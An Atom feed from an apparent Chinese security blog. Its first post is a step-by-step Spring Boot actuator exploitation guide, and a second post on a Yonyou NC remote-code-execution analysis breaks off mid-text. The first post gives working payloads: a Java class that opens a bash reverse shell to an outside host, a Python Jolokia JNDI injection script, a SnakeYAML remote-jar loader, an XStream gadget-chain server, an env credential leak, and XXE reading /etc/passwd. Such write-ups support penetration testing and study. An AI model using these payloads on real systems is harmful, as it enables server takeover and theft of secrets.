<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>认真学习的小白帽</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://drea1v1.github.io/"/>
  <updated>2020-08-10T14:20:41.536Z</updated>
  <id>https://drea1v1.github.io/</id>
  
  <author>
    <name>Drea1v1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Springboot漏洞利用</title>
    <link href="https://drea1v1.github.io/2020/08/10/Springboot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://drea1v1.github.io/2020/08/10/Springboot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2020-08-10T14:17:41.000Z</published>
    <updated>2020-08-10T14:20:41.536Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Springboot漏洞利用"><a href="#Springboot漏洞利用" class="headerlink" title="Springboot漏洞利用"></a>Springboot漏洞利用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>平时遇到很多springboot框架的系统，总结一下常见的利用方式，并且记录一下复现过程中所遇到的问题。</p><h2 id="Jolokia-RCE-JNDI注入"><a href="#Jolokia-RCE-JNDI注入" class="headerlink" title="Jolokia RCE(JNDI注入)"></a>Jolokia RCE(JNDI注入)</h2><blockquote><p>利用前提，查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法，以及java满足rmi远程加载限制的版本，看下图。</p></blockquote><p>祭出神图：</p><p><img src="/images/Springboot/image-20200729155302181.png" alt="image-20200729155302181"></p><p>默认配置的contextFactory:</p><p><img src="/images/Springboot/image-20200714214318953.png" alt="image-20200714214318953"></p><p>访问<a href="http://ip:port/jolokia/list，查看存在createJNDIRealm">http://ip:port/jolokia/list，查看存在createJNDIRealm</a>:</p><p><img src="/images/Springboot/image-20200729162032044.png" alt="image-20200729162032044"></p><p>架设rmi服务:</p><p><img src="/images/Springboot/image-20200805154339918.png" alt="image-20200805154339918"></p><p>架设web服务，放置恶意利用类:</p><p><img src="/images/Springboot/image-20200805154413412.png" alt="image-20200805154413412"></p><p>恶意利用类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit_shell</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">                java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/172.20.10.3/9999 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">"/jolokia/"</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:type=MBeanFactory"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"createJNDIRealm"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: [<span class="string">"Tomcat:type=Engine"</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"WRITE"</span>,</span><br><span class="line">    <span class="string">"attribute"</span>: <span class="string">"contextFactory"</span>,</span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"WRITE"</span>,</span><br><span class="line">    <span class="string">"attribute"</span>: <span class="string">"connectionURL"</span>,</span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"rmi://172.20.10.3:1099/Exploit_shell"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"stop"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"start"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: []</span><br><span class="line">&#125;</span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br></pre></td></tr></table></figure><p>执行后，加载远程恶意类，成功反弹shell:</p><p><img src="/images/Springboot/image-20200805154612574.png" alt="image-20200805154612574"></p><h3 id="小思考"><a href="#小思考" class="headerlink" title="小思考"></a>小思考</h3><p>实际环境下，我遇到java版本是不满足rmi的利用的，然后想试一下ldap加载利用类，修改了py脚本的set_contextFactory(这个其实不需要修改，因为我在调试的过程中发现默认是使用的ldap的com.sun.jndi.ldap.LdapCtxFactory，只有使用rmi的时候才需要修改为rmi的factory类)，以及加载的url为ldap协议，发现是不可行的。经过我的调试分析，该处利用的是rmi的initialdircontext(env)方法中存在jndi注入，正常情况下initialdircontext(env)的env是不可控的，但是这里可以直接通过提供的方法直接修改env的值，并且rmi在初始化过程直接调用了lookup()，刚好触发jndi注入。</p><p><img src="/images/Springboot/image-20200729160732716.png" alt="image-20200729160732716"></p><p><img src="/images/Springboot/image-20200729161033440.png" alt="image-20200729161033440"></p><p>对比了ldap和rmi的factory类，实际ldap是不会在initialdircontext(env)方法中触发jndi注入的，所以这里是用不了ldap协议，只能使用rmi协议。(这里只是我自己调试得出来的结果，并不是完全正确的，因为对springboot并不是很熟悉，可能其他大佬已经研究新的利用)</p><p><img src="/images/Springboot/image-20200715220903030.png" alt="image-20200715220903030"></p><h2 id="env-获取敏感信息"><a href="#env-获取敏感信息" class="headerlink" title="env 获取敏感信息"></a>env 获取敏感信息</h2><blockquote><p>默认情况下利用该漏洞可以获取带*的敏感信息，利用前提是需要系统的依赖中包含有eureka-client。</p></blockquote><p>查看<strong>/env</strong>中想要获取的敏感信息,比如这里的数据库密码：</p><p><img src="/images/Springboot/image-20200720202326624.png" alt="image-20200720202326624"></p><p>设置eureka.client的服务中心地址为http://${变量名}@ip/</p><p><img src="/images/Springboot/image-20200720202640340.png" alt="image-20200720202640340"></p><p>发送refresh包，有请求传入，获取到的信息用base64解码即可。</p><p><img src="/images/Springboot/image-20200720204305573.png" alt="image-20200720204305573"></p><p><img src="/images/Springboot/image-20200720204635602.png" alt="image-20200720204635602"></p><h2 id="SpringCloud-env-yaml利用"><a href="#SpringCloud-env-yaml利用" class="headerlink" title="SpringCloud env yaml利用"></a>SpringCloud env yaml利用</h2><blockquote><p>利用前提Springboot使用SpringCloud相关组件，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE</p></blockquote><p>yaml文件远程加载恶意利用jar包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;yaml.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="/images/Springboot/image-20200720231134160.png" alt="image-20200720231134160"></p><p>可以使用命令进行快速编译打包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p><img src="/images/Springboot/image-20200720233048643.png" alt="image-20200720233048643"></p><p>将恶意代码编译后打包成jar包，部署在web服务器上：</p><p><img src="/images/Springboot/image-20200729154105614.png" alt="image-20200729154105614"></p><p><img src="/images/Springboot/image-20200720230925293.png" alt="image-20200720230925293"></p><p>设置<strong>spring.cloud.bootstrap.location</strong>为yaml文件所在的vps。</p><p><img src="/images/Springboot/image-20200720233112107.png" alt="image-20200720233112107"></p><p>发送刷新包，弹出计算器(如需反弹或执行命令可以修改利用类的代码)</p><p><img src="/images/Springboot/image-20200720233022076.png" alt="image-20200720233022076"></p><h2 id="Springcloud-Netflix-xstream反序列化"><a href="#Springcloud-Netflix-xstream反序列化" class="headerlink" title="Springcloud-Netflix xstream反序列化"></a>Springcloud-Netflix xstream反序列化</h2><blockquote><p>利用前提，服务器使用Eureka-Client，即有加载spring-cloud-starter-netflix-eureka-client依赖。</p></blockquote><p>创建一个服务，将xstream格式的内容返回给请求者，这里可以使用python的flask框架快速搭建(python要先pip安装flask模块)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/', defaults=&#123;'path': ''&#125;)</span></span><br><span class="line"><span class="meta">@app.route('/&lt;path:path&gt;', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;</span></span><br><span class="line"><span class="string">          &lt;is class="javax.crypto.CipherInputStream"&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class="javax.crypto.NullCipher"&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class="java.util.Collections$EmptyIterator"/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;open&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;"""</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">'application/xml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">9000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/Springboot/image-20200721223255897.png" alt="image-20200721223255897"></p><p>发送请求设置服务地址:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.0.101:8090</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;192.168.0.101:9000&#x2F;xstream</span><br></pre></td></tr></table></figure><p>刷新:</p><p><img src="/images/Springboot/image-20200729163130406.png" alt="image-20200729163130406"></p><p>弹出计算器:</p><p><img src="/images/Springboot/image-20200805144136621.png" alt="image-20200805144136621"></p><p><strong>注:在复现过程中，直接在<string>标签中加上命令和参数发现无法执行，原来需要使用两个string标签拼接。该poc与Struts2-052的利用链基本一样，但是不是使用<map>类型而是<linked-hash-set>。</linked-hash-set></map></string></strong></p><h2 id="Jolokia-XXE-Logback"><a href="#Jolokia-XXE-Logback" class="headerlink" title="Jolokia XXE(Logback)"></a>Jolokia XXE(Logback)</h2><blockquote><p>利用前提，查看jolokia/list中存在的 Mbeans，是否存在logback 库提供的reloadByURL方法</p></blockquote><p><img src="/images/Springboot/image-20200806084926783.png" alt="image-20200806084926783"></p><p>logback.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://172.20.10.3:8090/fileread.dtd"</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>fileread.dtd:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#39;:%d;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>访问链接加载xml:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.3:8090&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;172.20.10.3!&#x2F;logback.xml</span><br></pre></td></tr></table></figure><p>将dtd和xml放置在同一服务器:</p><p><img src="/images/Springboot/image-20200806101731095.png" alt="image-20200806101731095"></p><p>成功读取文件内容:</p><p><img src="/images/Springboot/image-20200806102027810.png" alt="image-20200806102027810"></p><h3 id="小提示"><a href="#小提示" class="headerlink" title="小提示"></a>小提示</h3><p>在java中可以使用netdoc协议读取文件，并且该漏洞可以列目录读取文件名为目录即可。注:读取文件内容包含&lt;,&amp;等特殊字符时，会报错，可采取CDATA标签拼接，参考最后的文章(本地测试无法实现，原因未知)。</p><h2 id="Jolokia-RCE-Logback"><a href="#Jolokia-RCE-Logback" class="headerlink" title="Jolokia RCE(Logback)"></a>Jolokia RCE(Logback)</h2><blockquote><p>利用前提与xxe类似。</p></blockquote><p>访问链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8090&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;172.20.10.3:8090&#x2F;!&#x2F;logback_rce.xml</span><br></pre></td></tr></table></figure><p>logback_rce.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://172.20.10.3:1099/Exploit_shell"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Exploit_shell.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit_shell</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">                java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/172.20.10.3/9999 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web服务:</p><p><img src="/images/Springboot/image-20200806162417622.png" alt="image-20200806162417622"></p><p>rmi服务：</p><p><img src="/images/Springboot/image-20200806162357151.png" alt="image-20200806162357151"></p><p>反弹shell:</p><p><img src="/images/Springboot/image-20200806162728554.png" alt="image-20200806162728554"></p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/7811" target="_blank" rel="noopener">https://xz.aliyun.com/t/7811</a></p><p><a href="https://www.anquanke.com/post/id/173265" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173265</a></p><p><a href="https://www.anquanke.com/post/id/204314" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204314</a></p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Springboot漏洞利用&quot;&gt;&lt;a href=&quot;#Springboot漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;Springboot漏洞利用&quot;&gt;&lt;/a&gt;Springboot漏洞利用&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>用友nc远程命令执行漏洞分析</title>
    <link href="https://drea1v1.github.io/2020/06/17/%E7%94%A8%E5%8F%8Bnc%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drea1v1.github.io/2020/06/17/%E7%94%A8%E5%8F%8Bnc%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-06-16T16:33:52.000Z</published>
    <updated>2020-06-23T09:05:46.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NC用友远程命令执行漏洞分析"><a href="#NC用友远程命令执行漏洞分析" class="headerlink" title="NC用友远程命令执行漏洞分析"></a>NC用友远程命令执行漏洞分析</h1><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这个漏洞是<a href="https://mp.weixin.qq.com/s/eF1v4iYE4T_NqmztM3i6TA" target="_blank" rel="noopener"> 国家电网公司信息与网络安全重点实验室 </a>发现的，微信公众号做了简要分析，但是没有给出具体的poc。现在微信公众号已经将文章删除，但其他的安全公众号仍留有记录，看了一下分析过程，故想要跟着分析漏洞成因，编写poc，因此才有了这一篇分析文章。虽然此次漏洞公告上写的版本为NC6.5,但是实际上像较新版的1909 NCCloud(用友2018年11月发布的最新技术架构软件)等都是存在该漏洞的。</p><h2 id="0x01分析过程"><a href="#0x01分析过程" class="headerlink" title="0x01分析过程"></a>0x01分析过程</h2><h3 id="1-客户端分析"><a href="#1-客户端分析" class="headerlink" title="1.客户端分析"></a>1.客户端分析</h3><p>访问<code>http://ip:port/index.jsp</code>会提示有两种方法登录系统，一种是通过下载客户端、一种是使用浏览器访问。因为，浏览器访问的方式需要依赖不同用户设备上的java版本，IE浏览器，系统配置等环境因素，使用起来不是很方便，所以为了解决这些问题，用友提供了系统专用的UClient浏览器，可直接通过该浏览器访问nc而无需安装配置任意东西。</p><p><img src="/images/YonyouNc/1592135084333.png" alt="1592135084333"></p><p>下载NClient并安装后，进入启动页面，可以选择<strong><u>添加应用</u></strong>。添加完后，在安装目录中可以看到所安装的应用。</p><p><img src="/images/YonyouNc/1592135683158.png" alt="1592135683158"></p><p><img src="/images/YonyouNc/1592135763897.png" alt="1592135763897"></p><p>点击app.esc发现直接启动了nc客户端，查看文件内容，发现执行了NClogin65.jar文件中的nc.starter.test.JStarter：</p><p><img src="/images/YonyouNc/1592136037372.png" alt="1592136037372"></p><p>反编译NClogin65.jar，查看nc.starter.test.JStarter，调用nc.starter.ui.NCLauncher#main主要是与远程服务端通信，生成uI之类的操作。主要的通信代码并不在该jar包，继续在目录中寻找。</p><p><img src="/images/YonyouNc/1592136244643.png" alt="1592136244643"></p><p><img src="/images/YonyouNc/1592136335295.png" alt="1592136335295"></p><p>在nc_client_home\NCCACHE\CODE目录的子目录中有很多的jar包，其中external目录上的jar包是客户端通信的逻辑代码。</p><p><img src="/images/YonyouNc/1592136581135.png" alt="1592136581135"></p><p>随便点了一两个包，发现类还不少，如果逐个看的话很耗费时间，效率还不高，看了分析的文章发现用javaagent把调用的类都打印出来的方法可以解决这个问题，具体原理感兴趣的可以去网上搜索相关的文章，具体可以代码可以参考<a href="https://www.cnblogs.com/Java-Script/p/11089314.html" target="_blank" rel="noopener">javaagent项目中使用</a>。</p><p>之前在app.esc文件中可以看到启动jar的jvm配置信息，加上我们的javaagent的jar包，这样才能正常加载自己的javaagent。</p><p><img src="/images/YonyouNc/1592137794616.png" alt="1592137794616"></p><p>启动后可以看到把所有调用的类都输出出来了。</p><p><img src="/images/YonyouNc/1592137667520.png" alt="1592137667520"></p><p>这里可以配合idea的远程调试，添加参数jdwp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,address&#x3D;8000</span><br></pre></td></tr></table></figure><p><img src="/images/YonyouNc/1592151755174.png" alt="1592151755174"></p><p>打开客户端，随便输入账号密码点击登录后，查看log可以看到有login字眼的类：</p><p><img src="/images/YonyouNc/1592151973097.png" alt="1592151973097"></p><p>找到对应的nc.login.ui.LoginUISupport类，这个类方法很多，我一开始想的是通过一般登录都是带有request，response的，所以我就搜了request的关键字，在一个看起来比较像处理登录请求的方法下了断点，点击登录后果然是在这个地方断下来了。该方法主要是将输入的用户名、密码等值，在requestd类的变量赋值。</p><p><img src="/images/YonyouNc/1592152447890.png" 